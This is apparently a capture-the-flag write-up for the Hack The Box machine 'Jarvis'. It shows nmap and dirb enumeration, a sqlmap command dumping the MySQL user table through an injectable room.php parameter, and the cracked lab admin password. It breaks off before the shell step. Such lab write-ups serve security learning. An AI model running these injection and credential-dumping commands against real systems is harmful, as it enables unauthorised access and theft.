# Jarvis (HACK THE BOX)

Hey Guys,Today we will be doing Jarvis from HackTheBox,
<<logo-png>>
<br/>

## Nmap Scan

```
[sarthak@sarthak ~]$ nmap -sV 10.10.10.143 -Pn -v                                                                                      
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-29 17:55 IST
NSE: Loaded 43 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 17:55
Completed Parallel DNS resolution of 1 host. at 17:55, 0.01s elapsed
Initiating Connect Scan at 17:55
Scanning 10.10.10.143 [1000 ports]
Discovered open port 22/tcp on 10.10.10.143
Discovered open port 80/tcp on 10.10.10.143
Increasing send delay for 10.10.10.143 from 0 to 5 due to 79 out of 262 dropped probes since last increase.
Completed Connect Scan at 17:56, 54.66s elapsed (1000 total ports)
Initiating Service scan at 17:56
Scanning 2 services on 10.10.10.143
Completed Service scan at 17:56, 7.18s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.10.143.
Initiating NSE at 17:56
Completed NSE at 17:56, 2.45s elapsed
Initiating NSE at 17:56
Completed NSE at 17:56, 0.00s elapsed
Nmap scan report for 10.10.10.143
Host is up (0.58s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.01 seconds
```
We have only 2 ports opened(well one more but it was a rabbit hole) so let's start looking at port 80

## Enumerating Web Server

<<selection009>>
<br/>
After looking around we found a good candidate for vulnerabilites like sql injection or LFI,etc

## HARVESTING CREDENTIALS

We were able to harvest credentials of admin from this following query
```
sqlmap -u "http://10.10.10.143/room.php?cod=3" --random-agent -D mysql -T user  --dump
```
and the output is :-
```
Username:-DBadmin
Password:-*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```
But this is a sha1 hash so after some hit and trial with the hash we got the value decrypted :)
<<selection010>>
<br/>

```
password:-imissyou
```

## Getting Low priv shell

we found ```phpmyadmin``` in dirb results
```
[sarthak@sarthak ~]$ dirb http://10.10.10.143                                                                                    [0/29]

-----------------                
DIRB v2.22                       
By The Dark Raver                
-----------------                

START_TIME: Sat Jun 29 18:00:31 2019                               
URL_BASE: http://10.10.10.143/                                     
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt                                                                                   

-----------------                

GENERATED WORDS: 4612                                                                                                                  

---- Scanning URL: http://10.10.10.143/ ----                                                                                           
==> DIRECTORY: http://10.10.10.143/phpmyadmin/
```

